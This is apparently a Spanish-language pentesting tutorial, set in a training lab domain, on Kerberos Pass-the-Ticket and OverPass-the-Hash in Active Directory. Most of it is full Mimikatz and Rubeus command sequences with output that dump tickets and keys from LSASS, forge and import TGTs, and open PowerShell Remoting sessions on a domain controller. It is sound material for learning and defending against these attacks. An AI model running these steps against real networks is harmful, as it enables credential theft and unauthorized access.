
> Otro método para movernos de forma lateral en un entorno Active Directory es el ataque Pass the Ticket, donde robamos un ticket Kerberos en vez de un hash de contraseña. 
##### Kerberos Protocol Refresher

El sistema de autenticación **Kerberos** se basa en el uso de **tickets**. Su objetivo principal es evitar que las contraseñas de las cuentas se transmitan a cada servicio con el que interactúa un usuario. En lugar de ello, Kerberos gestiona localmente un conjunto de tickets que el sistema del usuario presenta a los servicios correspondientes. Cada ticket es válido únicamente para el servicio al que está destinado, lo que evita su reutilización indebida.

**🎫 Tipos de tickets en Kerberos**

1. **TGT (Ticket Granting Ticket)**  
    Es el primer ticket que obtiene un usuario en un sistema Kerberos. Permite al cliente solicitar posteriormente otros tickets para acceder a servicios específicos (TGS).
2. **TGS (Ticket Granting Service Ticket)**  
    Es el ticket que se utiliza para acceder a un servicio concreto, como una base de datos o un servidor de archivos. Permite que el servicio verifique la identidad del usuario.

**🔄 Flujo de autenticación Kerberos**

1. Cuando un usuario inicia sesión y solicita un **TGT**, su equipo cifra un **timestamp actual** con el **hash de su contraseña**.
2. Este mensaje se envía al **Controlador de Dominio (Domain Controller)**, que puede descifrarlo (porque conoce el hash de la contraseña) y, si es válido, responde con un **TGT**.
3. Con el **TGT en mano**, el usuario ya no necesita volver a introducir su contraseña para solicitar acceso a otros servicios.

🔍 **Ejemplo**:  
Si el usuario necesita conectarse a una base de datos **MSSQL**, solicita un ticket de servicio (TGS) al **KDC (Key Distribution Center)**, presentando su TGT como prueba de identidad. El KDC responde con un TGS específico para el servicio **MSSQL**, y este se presenta al servidor para obtener acceso.

**🚨 Ataque: Pass-the-Ticket (PtT)**

Una vez que un atacante ha obtenido un **ticket válido** (como un TGT o un TGS) desde una máquina comprometida, puede reutilizar ese ticket para autenticarse en otros sistemas sin necesidad de conocer la contraseña del usuario.

Esto es posible porque:
- Los tickets pueden copiarse desde la memoria del sistema (por ejemplo, usando herramientas como **Mimikatz**).
- Mientras el ticket no haya expirado y el sistema remoto lo acepte, puede ser reutilizado.
- Si el ticket es un **TGT de un usuario con privilegios elevados (como Domain Admin)**, el impacto puede ser **crítico**.

##### Escenario

Imaginemos que estamos en un pentestinb y conseguimos ganar acceso al PC de un usuario. Encontramos una forma de obtener privilegios de administrador y estamos trabajando con privilegios de administrador local. Vamos a ver distintas formas con las que podemos conseguir tickets de acceso y cómo podemos crear nuevos

##### Cosechando tickets Kerberos desde Windows

En Windows, los tickets son procesados y almacenados por el LSASS (Local Security Authority Sybsystem Service). Por tanto, para obtener un ticket de un sistema Windows, debemos comunicarnos con LSASS y solicitarlo. Como usuario no administrador solo puedes obtener tus propios tickets, pero como administrador puedes cogerlos todos. Podemos cosechar todos los tickets usando el módulo `sekurlsa::tickets /export` de `Mimikatz`. El resultado es una lista de archivos con extensión `.kirbi`. 

```cmd-session
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

...SNIP...

mimikatz # exit
Bye!
c:\tools> dir *.kirbi

Directory: c:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----

<SNIP>

-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi

<SNIP>
```

Los tickets que acaban con `$` corresponden a la cuenta del ordenador, que necesita un ticket para interactuar con el Active Directory. Los tickets de usuario tienen el nombre del usuario, seguido de un `@` que separa el nombre del servicio y el dominio, por ejemplo `[randomvalue]-username@service-domain.local.kirbi`. 

##### Rubeus - Exportar tickets

También podemos exportar tickets usando Rubeus con la opción `dump`. Esta opción puede ser usada para volcar todos los tickets si somos administradores. `Rubeus dump` imprimirá el ticket en Base64. Podemos usar la opción `/nowrap` para facilitar el copia pega.

```cmd-session
c:\tools> Rubeus.exe dump /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0
```

##### Pass the Key o OverPass-the-Hash

La técnica tradicional de **Pass the Hash (PtH)** consiste en reutilizar un hash de contraseña NTLM, sin involucrar al sistema Kerberos. Por otro lado, el enfoque **Pass the Key** o **OverPass-the-Hash** convierte un hash o clave (como `rc4_hmac`, `aes256_cts_hmac_sha1`, etc.) de un usuario unido al dominio en un **Ticket Granting Ticket (TGT)** completo.

Para falsificar nuestros tickets, necesitamos tener el **hash del usuario**. Podemos usar **Mimikatz** para volcar todas las claves de cifrado Kerberos de los usuarios mediante el módulo `sekurlsa::ekeys`. Este módulo enumera todos los tipos de clave presentes en el paquete Kerberos.

##### Mimikatz - extraer claves Kerberos

```cmd-session
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
<SNIP>

Authentication Id : 0 ; 444066 (00000000:0006c6a2)
Session           : Interactive from 1
User Name         : plaintext
Domain            : HTB
Logon Server      : DC01
Logon Time        : 7/12/2022 9:42:15 AM
SID               : S-1-5-21-228825152-3134732153-3833540767-1107

         * Username : plaintext
         * Domain   : inlanefreight.htb
         * Password : (null)
         * Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
<SNIP>
```

Ahora que tenemos acceso a las claves `AES256_HMAC` y `RC4_HMAC`, podemos realizar OverPass the Hash o Pass the Key usando Mimikatz y Rubeus

##### Mimikatz - Pass the Key o OverPass the Hash

```cmd-session
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

Esto creará un nuevo cmd.exe que podemos usar para acceder a cualquier servicio que queramos en el contexto del objetivo del usuario. Para forjar un ticket usando Rubeus, podemos usar el módulo `asktgt` con el usuario, dominio y hash que puede ser `/rc4`, `/aes128`, `/aes256`, o `/des`. 

##### Rubeus - Pass the key o OverPass the Hash

```cmd-session
c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

... SNIP...

  ServiceName           :  krbtgt/inlanefreight.htb
  ServiceRealm          :  inlanefreight.htb
  UserName              :  plaintext
  UserRealm             :  inlanefreight.htb
  StartTime             :  7/12/2022 11:28:26 AM
  EndTime               :  7/12/2022 9:28:26 PM
  RenewTill             :  7/19/2022 11:28:26 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  0TOKzUHdgBQKMk8+xmOV2w==
```

#### Pass the Ticket 

Ahora que tenemos algunos tickets Kerberos, podemos usarlos para movernos de forma lateral en un entorno. Con `Rubeus` realizamos un ataque OverPass the Hash y obtuvimos el ticket en Base64. En vez de eso, podríamos usar el flag `/ptt` para subir el ticket (TGT o TGS) a la sesión actual de login.

```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      ...
      
[+] Ticket successfully imported!

  ServiceName           :  krbtgt/inlanefreight.htb
  ServiceRealm          :  inlanefreight.htb
  UserName              :  plaintext
  UserRealm             :  inlanefreight.htb
  StartTime             :  7/12/2022 12:27:47 PM
  EndTime               :  7/12/2022 10:27:47 PM
  RenewTill             :  7/19/2022 12:27:47 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  PRG0wMmc4OznDz1YIAjdsA==
```

Otra forma es importar el ticket `.kirbi` que obtenemos con Mimikatz:

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

O podemos convertir un archivo `.kirbi` a base64 para realizar un ataque PtT

```powershell-session
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:<BASE64_RESULT>
```

Finalmente, podemos realizar el ataque PtT usando el módulo `kerberos::ptt` de Mimikatz y el archivo `.kirbi`

```cmd-session
C:\tools> mimikatz.exe 

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK
mimikatz # exit
Bye!
c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

### PtT con PowerShell Remoting (Windows)

**PowerShell Remoting** permite ejecutar scripts o comandos en un equipo remoto. Los administradores suelen utilizar esta funcionalidad para gestionar equipos a través de la red. Al habilitar PowerShell Remoting, se crean listeners tanto en **HTTP como en HTTPS**. El listener se ejecuta en el **puerto TCP/5985 para HTTP** y en el **puerto TCP/5986 para HTTPS**. Supongamos que encontramos una cuenta de usuario que **no tiene privilegios administrativos** en un equipo remoto, pero que **es miembro del grupo Remote Management Users**. En ese caso, podemos utilizar PowerShell Remoting para conectarnos a ese equipo y ejecutar comandos de forma remota.

##### Mimikatz - PowerShell Remoting con PtT

Para utilizar PowerShell Remoting con la técnica de **Pass the Ticket**, podemos emplear **Mimikatz** para importar nuestro ticket Kerberos y luego abrir una consola de PowerShell para conectarnos al equipo objetivo.

```cmd-session
C:\tools> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # exit
Bye!

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
[DC01]: PS C:\Users\john\Documents>
```

##### Rubeus - PowerShell Remoting con PtT

Rubeus tiene la opción `createonly`, que crea un proceso sacrifical de login. Este proceso está oculto por defecto, pero podemos especificar el flag `/show` para mostrar el proceso, y el resultado es el equivalente a `runas /netonly`. Esto evita el borrado de TGTs existentes para la sesión actual

```cmd-session
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

El comando de arriba abrirá una nueva ventana cmd. Desde esta ventaba, podemos ejecutar Rubeus para solicitar un nuevo TGT con la opción `/ptt` y conectarnos al DC usando PowerShell Remoting:

```cmd-session
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\john'
[*] Using domain controller: 10.129.203.120:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      ZWZyZWlnaHQuaHRi
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.htb
  ServiceRealm             :  INLANEFREIGHT.HTB
  UserName                 :  john
  UserRealm                :  INLANEFREIGHT.HTB
  StartTime                :  7/18/2022 5:44:50 AM
  EndTime                  :  7/18/2022 3:44:50 PM
  RenewTill                :  7/25/2022 5:44:50 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  5VdAaevnpxx/f9rXsDDLfK6tH+4qQ3f1GlOB1ClBWh0=
  ASREP (key)              :  9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```